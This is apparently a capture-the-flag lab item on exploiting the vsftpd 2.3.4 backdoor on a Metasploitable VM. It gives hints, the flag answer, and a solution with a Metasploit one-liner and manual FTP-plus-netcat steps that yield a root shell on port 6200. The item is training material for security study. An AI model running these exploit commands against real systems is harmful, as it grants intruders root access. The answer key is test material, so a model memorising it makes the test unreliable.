# Q043 — vsftpd 2.3.4 Backdoor

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Trigger the vsftpd 2.3.4 smiley-face backdoor on Metasploitable. Report the **backdoor port** that opens.

---

## 🎯 Flag Format

```
backdoor_port=<n>
```

Example: `backdoor_port=6200`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Login with username ending in `:)` triggers it.
</details>

<details>
<summary>Hint 2</summary>

Then connect to port 6200 via netcat.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.52.129; run'
# Or manual: ftp + USER user:) PASS x, then nc 192.168.52.129 6200
```

Port 6200 opens with root shell.

**Answer:** `backdoor_port=6200`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q043".
```
